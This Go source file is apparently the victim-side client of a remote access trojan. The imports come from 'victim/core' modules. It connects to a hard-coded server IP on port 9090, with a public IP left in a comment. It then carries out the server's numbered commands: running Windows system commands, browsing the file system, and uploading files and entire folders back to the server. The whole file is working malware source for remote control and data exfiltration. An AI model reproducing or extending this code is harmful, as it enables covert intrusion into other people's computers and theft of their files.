package main

import (
	"bufio"
	"fmt"
	"log"
	"strings"
	"victim/core/Download"
	"victim/core/ExecuteSystemCommandWindows"
	"victim/core/Move"
	"victim/core/Upload"
	"victim/core/handleConnection"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "192.168.178.86"
	//ServerIP := "147.53.196.47"
	Port := "9090"

	connection, err := handleConnection.ConnectionWithServer(ServerIP, Port)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with " + connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)
	loopControl := true

	for loopControl {
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Executing Commands on Windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)
		case user_input == "2":
			fmt.Println("[+] File system Navigation")
			err = Move.NavigateFileSystem(connection)
			DisplayError(err)
		case user_input == "3":
			fmt.Println("[+] Downloading File From Server")
			err = Download.ReadFileContents(connection)
			DisplayError(err)
		case user_input == "4":
			fmt.Println("[+] Uploading File To The Server")
			err = Upload.Upload2Server(connection)
			DisplayError(err)
		case user_input == "5":
			fmt.Println("[+] Downloading Folder")
			err = Upload.UploadFolder2Server(connection)
			DisplayError(err)
		case user_input == "99":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid input, try again")
		}
	}

	/*decoder := gob.NewDecoder(connection)
	data := &Data{}
	err = decoder.Decode(data)
	if err != nil {
		fmt.Println("[-] Unable to decode")
		log.Fatal(err)
	} else {
		fmt.Println("[+] Successfully decoded data")
		fmt.Println(data.Name)
		fmt.Println(data.Age)
		fmt.Println(data.ID)

	}
	connection.Close()
	reader := bufio.NewReader(connection)
	dataReceived, err := reader.ReadString('\n')
	if err != nil {
		log.Fatal(err)
	}
	data := strings.TrimSuffix(dataReceived, "\n")
	fmt.Println(data)*/

}
